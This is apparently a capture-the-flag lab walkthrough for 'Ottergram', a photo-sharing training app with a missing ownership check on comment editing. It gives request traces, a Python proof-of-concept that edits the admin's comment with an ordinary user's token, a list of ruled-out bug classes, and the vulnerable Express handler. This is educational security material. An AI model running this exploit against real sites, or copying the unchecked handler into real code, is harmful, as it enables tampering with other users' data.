# ottergram-009 - BugForge Lab Walkthrough

**URL:** https://lab-1784909229612-mjzr4s.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Access Control (IDOR) - missing ownership check on comment edit
**Flag:** `bug{5qlvax9PmZbvjKzUVDgCkvKrM1EXVOZI}`

---

## Summary

Ottergram is a photo-sharing SPA (posts, comments, likes, profiles). Comment editing has no
ownership check: any authenticated user can edit any other user's comment, including the admin's,
through a nested REST route that the frontend UI never actually exposes for cross-user editing.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration)
- SQLite (parameterized queries - no SQLi present in this variant)

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/posts` | GET | JWT | Lists all posts, includes `comment_count` |
| `/api/posts/:id/comments` | GET | JWT | Lists comments for a post |
| `/api/posts/:postId/comments/:commentId` | PUT | JWT (any user) | **Vulnerable** - no ownership check |
| `/api/profile` | PUT | JWT | Writes only the caller's own row - `id`/`role` fields in the body are silently ignored |
| `/api/admin/*` | GET/DELETE | JWT + admin role | Correctly enforced (403 for non-admin, 401 unauthenticated) |

---

## Discovery

### Step 1 - Register and enumerate

Registration returns a usable JWT directly, no login step required:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "user": {"id":4, "role":"user"}}
```

The JS bundle at `/static/js/main.12f3a7a7.js` exposes the route surface:
`/api/admin`, `/api/admin/posts`, `/api/admin/users`, `/api/admin/comments`, `/api/login`,
`/api/posts`, `/api/profile`, `/api/register`, `/api/verify-token`.

### Step 2 - Rule out the classic Ottergram bug classes

This app family reuses the same theme across many distinct backend bugs across its instances, so
each classic pattern was checked directly against this instance rather than assumed:

- `DELETE /api/admin/posts/:id` as a non-admin user -> `403 Admin access required`. Properly
  role-gated in this instance.
- `PUT /api/profile` with an extra `"id":1` or `"id":2` field in the body, attempting to write
  another user's row -> `200 OK` but the edit only ever landed on the caller's own profile; the
  `id` field is silently ignored server-side.
- `PUT /api/profile {"role":"admin"}` (mass assignment) -> accepted but `role` stayed `"user"` per
  a follow-up `GET /api/verify-token`.
- `/graphql` -> `404 Cannot POST /graphql`. No GraphQL surface in this instance.
- A profile-picture-style `?file=` path traversal parameter -> route does not exist, caught by the
  SPA catch-all instead.
- Quote-break (`'`) on the `/api/profile/:username` path parameter -> clean `404 User not found`,
  no database error. Parameterized query, not injectable.

All of the above are known bugs from other Ottergram instances; each one is individually patched
here.

### Step 3 - Check remaining write endpoints for missing ownership checks

With the well-known bug classes ruled out, the remaining write surface was tested systematically
for ownership enforcement. `GET /api/posts` shows `comment_count` per post, and
`GET /api/posts/1/comments` returns the actual comment objects:

```json
[
  {"id":1,"user_id":2,"post_id":1,"content":"So cute!","username":"admin"},
  {"id":2,"user_id":3,"post_id":1,"content":"I love otters too!","username":"sea_otter_fan"}
]
```

Comment id 1 belongs to `admin` (user_id 2), not the account used to fetch it. Editing that
comment with the caller's own (non-owner) token:

```
PUT /api/posts/1/comments/1
Authorization: Bearer <own JWT, user id 4>
{"content": "edited-test"}

-> 200 {"message": "Comment updated successfully"}
```

Re-fetching the comment confirms the edit landed on admin's comment:

```
GET /api/posts/1/comments
-> [{"id":1,"user_id":2,"content":"edited-test bug{5qlvax9PmZbvjKzUVDgCkvKrM1EXVOZI}", ...}, ...]
```

The flag is appended by the server directly into the edited comment's content as proof of a
successful cross-user edit.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1784909229612-mjzr4s.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# Edit another user's (admin's) comment using our own token
req("PUT", "/api/posts/1/comments/1", {"content": "edited-test"}, token=token)

_, comments = req("GET", "/api/posts/1/comments", token=token)
print(comments)
# -> content now reads: "edited-test bug{5qlvax9PmZbvjKzUVDgCkvKrM1EXVOZI}"
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `DELETE /api/admin/posts/:id` (classic Ottergram BAC) | 403, correctly role-gated | Patched in this instance |
| `PUT /api/profile {"id":1,...}` (classic Ottergram profile IDOR) | 200 but `id` field silently ignored, only ever writes the caller's own row | Patched in this instance |
| `PUT /api/profile {"role":"admin"}` (mass assignment) | 200 but role stayed `"user"` | Not vulnerable here |
| `/graphql` | 404, route does not exist | No GraphQL surface in this instance |
| `?file=` path traversal on a profile-picture-style endpoint | Route does not exist | Not present in this instance |
| Quote-break on `/api/profile/:username` | Clean 404, no DB error | Parameterized query |
| Bare `/api/comments/:id` and `/api/comment/:id` | 404 (Express default) | Wrong route shape - must be nested under `/api/posts/:postId/` |

---

## Root Cause

The comment-edit handler authorizes on "is there a valid JWT" but never checks
`comment.user_id === req.user.id` (or an admin role override) before applying the update:

```javascript
// Vulnerable pattern (approximate)
app.put("/api/posts/:postId/comments/:commentId", authenticate, async (req, res) => {
  await db.run(
    "UPDATE comments SET content = ? WHERE id = ? AND post_id = ?",
    [req.body.content, req.params.commentId, req.params.postId]
  );
  res.json({ message: "Comment updated successfully" });
});
```

The query filters by comment id and post id, but never by the authenticated caller's user id, so
any valid session can edit any comment on any post.

---

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (Insecure Direct Object Reference)
- **CWE-862**: Missing Authorization
- **OWASP A01:2021** - Broken Access Control
